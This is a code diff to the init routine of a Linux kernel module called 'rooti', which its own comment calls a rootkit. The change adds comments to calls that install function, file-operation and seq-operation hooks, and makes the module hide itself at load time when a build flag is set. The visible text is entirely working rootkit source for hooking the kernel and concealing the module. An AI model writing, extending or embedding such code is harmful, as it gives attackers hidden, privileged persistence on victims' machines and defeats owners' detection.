@@ -264,26 +264,31 @@ static int __init rooti_init(void)
         return ret;
     }
 
-    // Install hooks :D
+    // Install function hooks :D
     ret = rooti_install_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
     if (ret < 0) {
         printk(KERN_DEBUG "rooti: rooti_install_hooks() failed: %d\n", ret);
         return ret;
     }
 
+    // Install file operation hooks :D
     ret = rooti_install_file_ops_hooks(file_ops_hooks, ARRAY_SIZE(file_ops_hooks));
     if (ret < 0) {
         printk(KERN_DEBUG "rooti: rooti_install_file_ops_hooks() failed: %d\n", ret);
         return ret;
     }
 
+    // Install seq operations hooks :D
     ret = rooti_install_seq_ops_hooks(seq_ops_hooks, ARRAY_SIZE(seq_ops_hooks));
     if (ret < 0) {
         printk(KERN_DEBUG "rooti: rooti_install_seq_ops_hooks() failed: %d\n", ret);
         return ret;
     }
 
-    // TODO: at some point rooti_hideme() should be called on init
+    // If configured to be hidden by default, hide this rootkit
+#ifdef ROOTI_HIDEME_DEFAULT
+    rooti_hideme();
+#endif
 
     return 0;
 }
